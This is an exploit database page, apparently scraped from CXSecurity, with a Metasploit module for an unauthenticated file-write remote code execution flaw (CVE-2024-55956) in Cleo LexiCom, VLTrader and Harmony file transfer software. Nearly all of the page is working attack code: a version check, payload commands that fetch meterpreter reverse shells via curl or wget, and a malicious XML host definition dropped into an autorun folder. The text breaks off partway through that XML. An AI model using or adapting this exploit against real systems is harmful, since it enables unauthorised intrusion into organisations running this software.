---
title: Cleo LexiCom / VLTrader / Harmony 5.8.0.23 Remote Code Execution
url: https://cxsecurity.com/issue/WLB-2025010023
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2025-01-23
fetch_date: 2025-10-06T20:09:19.526263
---

# Cleo LexiCom / VLTrader / Harmony 5.8.0.23 Remote Code Execution

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **Cleo LexiCom / VLTrader / Harmony 5.8.0.23 Remote Code Execution** **2025.01.22**  Credit:  **[MSF](https://cxsecurity.com/author/MSF/1/)**  Risk: **High**  Local: **No**  Remote: ****Yes****  CVE: **N/A**  CWE: **N/A** | |

##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
class MetasploitModule < Msf::Exploit::Remote
Rank = ExcellentRanking
include Msf::Exploit::Remote::HttpClient
prepend Msf::Exploit::Remote::AutoCheck
include Msf::Exploit::FileDropper
def initialize(info = {})
super(
update\_info(
info,
'Name' => 'Cleo LexiCom, VLTrader, and Harmony Unauthenticated Remote Code Execution',
'Description' => %q{
This module exploits an unauthenticated file write vulnerability in Cleo LexiCom, VLTrader, and Harmony
versions 5.8.0.23 and below.
},
'License' => MSF\_LICENSE,
'Author' => [
# MSF Exploit & Rapid7 Analysis
'sfewer-r7',
'remmons-r7'
],
'References' => [
['CVE', '2024-55956'],
['URL', 'https://support.cleo.com/hc/en-us/articles/28408134019735-Cleo-Product-Security-Update-CVE-2024-55956'], # Vendor Advisory
['URL', 'https://attackerkb.com/topics/geR0H8dgrE/cve-2024-55956/rapid7-analysis'], # Rapid7 Analysis
['URL', 'https://www.rapid7.com/blog/post/2024/12/10/etr-widespread-exploitation-of-cleo-file-transfer-software-cve-2024-50623/'], # Rapid7 Blog
['URL', 'https://www.huntress.com/blog/threat-advisory-oh-no-cleo-cleo-software-actively-being-exploited-in-the-wild'] # Huntress Blog
],
'DisclosureDate' => '2024-12-09',
'Platform' => %w[java win linux unix],
'Arch' => [ARCH\_JAVA, ARCH\_CMD],
'Privileged' => true, # 'NT AUTHORITY\SYSTEM' on Windows. On Linux it depends on how the product was installed.
'Targets' => [
[
# Tested against Cleo LexiCom/5.8.0.21 on Windows Server 2022, with payloads:
# java/meterpreter/reverse\_tcp
'Java', {
'Platform' => 'java',
'Arch' => ARCH\_JAVA
}
],
[
# Tested against Cleo LexiCom/5.8.0.21 on Windows Server 2022, with payloads:
# cmd/windows/http/x64/meterpreter/reverse\_tcp
# cmd/windows/http/x64/meterpreter\_reverse\_tcp
'Windows Command', {
'Platform' => 'win',
'Arch' => ARCH\_CMD,
'DefaultOptions' => {
'FETCH\_COMMAND' => 'CURL',
'FETCH\_WRITABLE\_DIR' => '%TEMP%'
}
}
],
[
'Linux Command', {
'Platform' => %w[linux unix],
'Arch' => ARCH\_CMD,
'DefaultOptions' => {
'FETCH\_COMMAND' => 'WGET',
'FETCH\_WRITABLE\_DIR' => '/tmp'
}
}
]
],
'DefaultOptions' => {
'RPORT' => 5080,
'SSL' => false,
# The exploit relies on the target service processing a file written to an 'autorun' folder, which is processed
# periodically. We bump up the WfsDelay to account for this, and give the exploit payload some extra time to trigger.
'WfsDelay' => 10
},
'DefaultTarget' => 0,
'Notes' => {
'Stability' => [CRASH\_SAFE],
'Reliability' => [REPEATABLE\_SESSION],
'SideEffects' => [IOC\_IN\_LOGS]
}
)
)
end
def check
res = send\_request\_cgi(
'method' => 'GET',
'uri' => normalize\_uri(target\_uri.path)
)
return CheckCode::Unknown('Connection failed') unless res
# We expect the server to respond with an HTTP Server header like "Cleo LexiCom/5.8.0.0 (Windows Server 2022)".
# Note, the target product may be either LexiCom, VLTrader, or Harmony.
if res.headers.key?('Server') && (res.headers['Server'] =~ %r{cleo\s+(?:lexicom|vltrader|harmony)/(\d+\.\d+\.\d+\.\d+)}i)
if Rex::Version.new(Regexp.last\_match(1)) <= Rex::Version.new('5.8.0.23')
return CheckCode::Appears(res.headers['Server'])
end
return CheckCode::Safe(res.headers['Server'])
end
CheckCode::Unknown
end
def exploit
jar\_path = nil
jar\_file = nil
command = nil
case target['Platform']
when 'java'
jar\_path = "temp/#{Rex::Text.rand\_text\_alpha\_lower(8)}"
jar\_file = payload.encoded\_jar(random: true)
# The product ships its own JRE, so we can use a relative path to run our Java JAR file.
command = "jre/bin/java -jar \"#{jar\_path}\""
when 'win'
command = "cmd.exe /c \"#{payload.encoded}\""
when 'linux', 'unix'
command = "/bin/sh -c \"#{payload.encoded}\""
else
fail\_with(Failure::BadConfig, 'Unsupported target platform')
end
if command.include? ']]>'
# As we wrap the command in XML CDATA tags, we cannot have the closing CDATA tag in the command.
fail\_with(Failure::BadConfig, 'Payload cannot contain the CDATA closing tag "]]>"')
end
host\_guid = SecureRandom.uuid
mailbox\_guid = SecureRandom.uuid
action\_guid = SecureRandom.uuid
# This is based on the XML file that Huntress published (https://www.huntress.com/blog/threat-advisory-oh-no-cleo-cleo-software-actively-being-exploited-in-the-wild)
host\_xml = %(<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Host alias="#{host\_guid}" application="" by="Administrator" class="\*CwwQNwwbER4SEhA8Ex4cEDNRQQwRBwsbGk5TEQdOEAUWTkM\*" created="2020/10/10 00:00:00" enabled="True" enc="#{SecureRandom.uuid}" local="True" modevent="Modified" modified="2020/10/10 00:00:00" moditem="&lt;copy&gt;myCommands@Local Commands" modtype="Actions" preconfigured="2009/10/30 15:15" ready="True" standaloneaction="False" test="False" transport="" type="" uid="#{SecureRandom.uuid}" version="1">
<Connecttype>0</Connecttype>
<Inbox>inbox\</Inbox>
<Index>0</Index>
<Indexdate>-1</Indexdate>
<Internal>0</Internal>
<Notes>This contains mailboxes for a local host which can be used for local commands only.</Notes>
<Origin>Local Commands</Origin>
<Outbox>outbox\</Outbox>
<Port>0</Port>
<Runninglocalrequired>True</Runninglocalrequired>
<Secureportrequired>False</Secureportrequired>
<Uidswpd>True</Uidswpd>
<Advanced>ZipCompressionLevel=System Default</Advanced>
<Advanced>XMLEncryptionAlgorithm=System Default</Advanced>
<Advanced>HighPriorityIncomingWeight=10</Advanced>
<Advanced>PGPHashAlgorithm=System Default</Advanced>
<Advanced>HighPriorityOutgoingWeight=10</Advanced>
<Advanced>PGPCompressionAlgorithm=System Default</Advanced>
<Advanced>OutboxSort=System Default</Advanced>
<Advanced>PGPEncryptionAlgorithm=System Default</Advanced>
<Mailbox alias="#{mailbox\_guid}" class="\*BxAdExYeMgwbER4SEhA8Ex4cEDNR" created="2020/10/10 00:00:00" enabled="True" localdecryptcert="" localencryptcert="" localpackaging="None" ...